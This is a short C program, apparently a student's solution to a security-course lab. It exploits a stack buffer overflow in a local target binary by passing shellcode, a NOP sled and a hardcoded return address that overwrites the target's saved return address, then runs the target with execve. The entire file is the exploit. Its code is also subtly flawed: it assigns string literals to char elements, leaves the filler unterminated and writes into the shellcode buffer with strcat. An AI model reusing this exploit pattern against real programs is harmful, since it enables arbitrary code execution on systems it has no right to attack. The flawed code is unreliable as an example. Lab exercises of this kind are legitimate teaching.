#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char  filler[72];
	int i;

	// NOPs to act as buffer for shellcode
	for  (i = 0; i < 72 ; i++ ){
	  filler[i]="\x90";
	}

	args[0] = TARGET;

	//set the arg to be the NOPs + Shellcode + The return address to be beginning of buf
	//such that the return address of lab_main is overwritten
	args[1] = strcat(shellcode,strcat( filler , "\x10\xfe\x42\x40"));
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
